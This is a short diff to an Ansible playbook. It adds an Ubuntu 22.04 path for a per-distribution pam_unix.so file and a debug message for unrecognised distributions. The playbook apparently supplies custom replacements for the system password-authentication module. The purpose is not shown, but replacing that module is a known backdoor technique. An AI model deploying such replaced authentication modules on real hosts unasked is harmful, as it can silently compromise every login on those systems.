@@ -13,12 +13,24 @@
     - ansible_distribution == "Ubuntu"
     - ansible_distribution_version == "24.04"
 
+- name: Set distro-specific file path for Ubuntu 22.04
+  ansible.builtin.set_fact:
+    pam_file_src: "ubuntu-22.04/pam_unix_ubuntu22.so"
+  when: 
+    - ansible_distribution == "Ubuntu"
+    - ansible_distribution_version == "22.04"
+
 - name: Set distro-specific file path for Debian 12
   ansible.builtin.set_fact:
     pam_file_src: "debian-12/pam_unix_debian12.so"
   when:
     - ansible_distribution == "Debian"
     - ansible_distribution_major_version == "12"
+
+- name: Print a message if distro not found
+  ansible.builtin.debug:
+    msg: "DISTRO NOT FOUND. USING DEFAULT SOLUTION"
+  when: pam_file_src is not defined
 
 - name: Set generic file path for other distros
   ansible.builtin.set_fact:
